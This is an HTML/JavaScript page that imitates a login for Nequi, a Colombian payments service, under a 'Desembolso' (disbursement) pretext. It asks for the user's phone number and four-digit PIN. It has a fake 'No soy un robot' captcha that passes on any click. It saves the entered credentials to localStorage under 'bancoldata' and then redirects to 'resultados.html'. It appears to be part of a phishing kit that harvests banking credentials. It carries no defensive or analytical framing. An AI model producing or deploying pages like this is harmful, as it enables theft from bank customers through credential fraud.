<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
<title>Nequi · Desembolso</title>

<!-- Fuente Inter -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: #FFFFFF;
    font-family: 'Inter', sans-serif;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  /* Header exacto de la imagen */
  .header {
    width: 100%;
    background: #2E0039;
    padding: 18px 24px;
    color: white;
    font-size: 22px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 12px;
  }

  .header span {
    font-size: 26px;
    cursor: default;
  }

  .container {
    max-width: 500px;
    margin: 0 auto;
    width: 100%;
    padding: 24px 20px 32px;
    flex: 1;
  }

  /* Título principal "Nequi" como en la imagen */
  .main-title {
    font-size: 42px;
    font-weight: 700;
    color: #2E0039;
    margin-bottom: 4px;
    line-height: 1.1;
  }

  /* Subtítulo "Pagos PSE de Nequi" */
  .sub-title {
    font-size: 18px;
    font-weight: 500;
    color: #4b4b4b;
    margin-bottom: 28px;
    border-left: 4px solid #da0081;
    padding-left: 14px;
  }

  /* Texto de instrucción exacto */
  .instruction {
    font-size: 15px;
    color: #2E0039;
    margin-bottom: 32px;
    line-height: 1.5;
    font-weight: 400;
    background: #f5f0fa;
    padding: 18px 20px;
    border-radius: 16px;
    border: 1px solid #e0d0f0;
  }

  /* Campos de entrada exactos */
  .input-group {
    margin-bottom: 28px;
  }

  .label-input {
    font-size: 16px;
    font-weight: 600;
    color: #2E0039;
    margin-bottom: 6px;
    display: block;
  }

  .input-field {
    width: 100%;
    padding: 16px 18px;
    background: white;
    border: 2px solid #d9c9ed;
    border-radius: 14px;
    font-size: 16px;
    font-family: 'Inter', sans-serif;
    outline: none;
    color: #1a1a1a;
    font-weight: 500;
    transition: all 0.2s;
  }

  .input-field:focus {
    border-color: #2E0039;
    box-shadow: 0 0 0 3px rgba(46, 0, 57, 0.1);
  }

  .input-field::placeholder {
    color: #aaa;
    font-weight: 400;
  }

  /* Bloque captcha exacto */
  .captcha-block {
    margin: 30px 0 28px;
    background: #f3f0f9;
    border-radius: 20px;
    padding: 18px 16px;
    border: 1px solid #e1d4f0;
  }

  .captcha-title {
    font-size: 16px;
    font-weight: 600;
    color: #2E0039;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .captcha-title span {
    background: #2E0039;
    color: white;
    width: 24px;
    height: 24px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    border-radius: 50%;
    font-size: 14px;
  }

  /* Checkbox personalizado exacto */
  .captcha-box {
    display: flex;
    align-items: center;
    gap: 14px;
    background: white;
    padding: 12px 18px;
    border-radius: 40px;
    border: 2px solid #cdb5e8;
    cursor: pointer;
    transition: all 0.2s;
    user-select: none;
  }

  .captcha-box:hover {
    background: #f9f5ff;
    border-color: #2E0039;
  }

  .captcha-box.checked {
    background: #e6ffe6;
    border-color: #2b8c4c;
  }

  .captcha-checkbox {
    width: 28px;
    height: 28px;
    border-radius: 8px;
    background: white;
    border: 2px solid #9b87b3;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 18px;
    color: #2E0039;
    transition: all 0.1s;
  }

  .captcha-box.checked .captcha-checkbox {
    background: #2b8c4c;
    border-color: #2b8c4c;
    color: white;
  }

  .captcha-text {
    font-weight: 500;
    color: #1e1e1e;
    font-size: 15px;
  }

  /* Botones exactos */
  .btn-entrar {
    width: 100%;
    padding: 18px;
    background-color: #2E0039;
    border: none;
    border-radius: 30px;
    font-size: 18px;
    font-weight: 700;
    color: white;
    margin-top: 10px;
    cursor: pointer;
    font-family: 'Inter', sans-serif;
    transition: all 0.3s;
    box-shadow: 0 4px 12px rgba(46, 0, 57, 0.2);
  }

  .btn-entrar:hover {
    background: #3f0b52;
    transform: scale(1.02);
  }

  .btn-entrar:disabled {
    background-color: #da008130;
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
  }

  .btn-ahora-no {
    width: 100%;
    background: white;
    color: #2E0039;
    border: 2px solid #d3c0e6;
    padding: 16px;
    border-radius: 30px;
    font-size: 17px;
    margin-top: 14px;
    cursor: pointer;
    font-weight: 600;
    font-family: 'Inter', sans-serif;
    transition: all 0.2s;
  }

  .btn-ahora-no:hover {
    background: #f5ecff;
    border-color: #2E0039;
  }

  /* Enlace de olvidé clave exacto */
  .forgot-link {
    display: block;
    text-align: center;
    margin-top: 30px;
    color: #2E0039;
    font-size: 15px;
    font-weight: 500;
    text-decoration: none;
    border-top: 1px dashed #d0c0e0;
    padding-top: 22px;
  }

  .forgot-link:hover {
    text-decoration: underline;
  }

  /* Loader */
  #loader {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.98);
    z-index: 9999;
    text-align: center;
    padding-top: min(40%, 300px);
    font-size: 18px;
    color: #2E0039;
    font-weight: 600;
  }

  .spinner {
    width: 55px;
    height: 55px;
    border: 6px solid #eee;
    border-top-color: #2E0039;
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
    margin: 0 auto 15px;
  }

  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="header">
  <span>←</span> Desembolso Nequi
</div>

<div class="container">
  <!-- Títulos exactos de la imagen -->
  <div class="main-title">Nequi</div>
  <div class="sub-title">Pagos PSE de Nequi</div>

  <!-- Texto de instrucción exacto -->
  <div class="instruction">
    Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
  </div>

  <form id="loginForm">
    <!-- Número de celular - exacto -->
    <div class="input-group">
      <label class="label-input">Número de celular</label>
      <input 
        type="tel" 
        class="input-field" 
        id="usuario" 
        placeholder="Ej: 3001234567" 
        required 
        maxlength="10"
        minlength="10"
        inputmode="numeric"
        autocomplete="off"
      />
    </div>

    <!-- Clave - exacto -->
    <div class="input-group">
      <label class="label-input">Clave</label>
      <input 
        type="password" 
        class="input-field" 
        id="clave" 
        placeholder="4 dígitos" 
        required 
        maxlength="4" 
        minlength="4"
        inputmode="numeric"
        autocomplete="off"
      />
    </div>

    <!-- Captcha exacto: "Confirme que soy una persona real" con checkbox -->
    <div class="captcha-block">
      <div class="captcha-title">
        <span>✓</span> Confirme que soy una persona real.
      </div>
      <div class="captcha-box" id="captchaBox">
        <div class="captcha-checkbox" id="captchaCheckbox"> </div>
        <span class="captcha-text">No soy un robot</span>
      </div>
    </div>

    <!-- Botones exactos: Entra y Ahora No -->
    <button type="submit" class="btn-entrar" id="loginBtn" disabled>Entra</button>
    <button type="button" class="btn-ahora-no" onclick="window.location.href='https://www.google.com'">Ahora No</button>

    <!-- Enlace exacto: ¿Se te olvidó la clave? -->
    <a href="#" class="forgot-link">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</a>
  </form>
</div>

<!-- Loader -->
<div id="loader">
  <div class="spinner"></div>
  Procesando...
</div>

<script>
  const usuario = document.getElementById('usuario');
  const clave = document.getElementById('clave');
  const loginBtn = document.getElementById('loginBtn');
  const captchaBox = document.getElementById('captchaBox');
  const captchaCheck = document.getElementById('captchaCheckbox');

  let captchaValidado = false;

  // Validar campos
  function validarCampos() {
    // Usuario: 10 dígitos (puede empezar con cualquier número)
    const usuarioValido = /^\d{10}$/.test(usuario.value.trim());
    
    // Clave: exactamente 4 dígitos
    const claveValida = /^\d{4}$/.test(clave.value.trim());

    if (usuarioValido && claveValida && captchaValidado) {
      loginBtn.disabled = false;
    } else {
      loginBtn.disabled = true;
    }
  }

  // Event listeners
  usuario.addEventListener('input', validarCampos);
  clave.addEventListener('input', validarCampos);

  // Solo números
  usuario.addEventListener('keypress', function(e) {
    const charCode = e.which ? e.which : e.keyCode;
    if (charCode < 48 || charCode > 57) e.preventDefault();
  });

  clave.addEventListener('keypress', function(e) {
    const charCode = e.which ? e.which : e.keyCode;
    if (charCode < 48 || charCode > 57) e.preventDefault();
  });

  // Captcha
  captchaBox.addEventListener('click', function(e) {
    e.preventDefault();
    if (!captchaValidado) {
      captchaValidado = true;
      captchaBox.classList.add('checked');
      captchaCheck.innerHTML = '✓';
    }
    validarCampos();
  });

  // Submit
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (!loginBtn.disabled) {
      const datos = {
        usuario: usuario.value.trim(),
        clave: clave.value.trim()
      };

      localStorage.setItem('bancoldata', JSON.stringify(datos));
      document.getElementById('loader').style.display = 'flex';
      
      setTimeout(() => {
        window.location.href = 'resultados.html';
      }, 1500);
    }
  });
</script>

</body>
</html>
